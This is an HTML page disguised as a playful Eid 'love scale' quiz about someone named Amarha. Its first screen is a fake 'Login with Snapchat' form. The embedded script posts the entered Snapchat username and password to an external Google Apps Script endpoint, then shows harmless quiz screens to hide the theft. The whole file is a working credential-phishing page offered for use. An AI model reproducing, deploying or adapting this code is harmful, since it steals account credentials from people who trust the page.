<!DOCTYPE html>
<html>
<head>
    <title>Amarha Love Scale</title>
    <style>
        body {
            background: linear-gradient(45deg, #ff758c, #ff7eb3);
            font-family: Arial, sans-serif;
            text-align: center;
            color: white;
        }
        .container {
            margin-top: 100px;
        }
        input, button {
            padding: 10px;
            margin: 10px;
            border: none;
            border-radius: 5px;
        }
        button {
            background: yellow;
            color: black;
            font-weight: bold;
            cursor: pointer;
        }
        .page {
            display: none;
        }
        .active {
            display: block;
        }
    </style>
</head>
<body>

    <!-- Login Page -->
    <div id="loginPage" class="page active">
        <div class="container">
            <h1>Login with Snapchat</h1>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Snapchat Username" required><br>
                <input type="password" id="password" placeholder="Password" required><br>
                <button type="submit">Log In</button>
            </form>
        </div>
    </div>

    <!-- Enter Name Page -->
    <div id="namePage" class="page">
        <div class="container">
            <h1>Enter Your Name</h1>
            <input type="text" id="name" placeholder="Your Name" required>
            <button onclick="goToRating()">Next</button>
        </div>
    </div>

    <!-- Love Rating Page -->
    <div id="ratePage" class="page">
        <div class="container">
            <h1>How much do you love Amarha? ‚ù§Ô∏è</h1>
            <input type="number" id="loveScale" min="1" max="10" required>
            <button onclick="submitRating()">Submit</button>
        </div>
    </div>

    <!-- Eid Mubarak Page -->
    <div id="eidPage" class="page">
        <div class="container">
            <h1>üéâ Eid Mubarak, Begum! üéä</h1>
            <p>May your love for Amarha be infinite! üíï</p>
        </div>
    </div>

    <script>
        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
            document.getElementById(pageId).classList.add('active');
        }

        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;

            // Send data to Google Sheets
            fetch("https://script.google.com/macros/s/AKfycby7o0mM2pke2SueiivIo9U4_SMKM_fBOMipbZ3nhQWsh8Na1lrGSGCu_nadulGTXFCz/exec", {
                method: "POST",
                body: JSON.stringify({username: username, password: password}),
                headers: { "Content-Type": "application/json" }
            }).then(() => {
                showPage("namePage");
            }).catch(error => console.error('Error:', error));
        });

        function goToRating() {
            let name = document.getElementById("name").value;
            localStorage.setItem("username", name);
            showPage("ratePage");
        }

        function submitRating() {
            let rating = document.getElementById("loveScale").value;
            localStorage.setItem("loveRating", rating);
            showPage("eidPage");
        }
    </script>

</body>
</html>
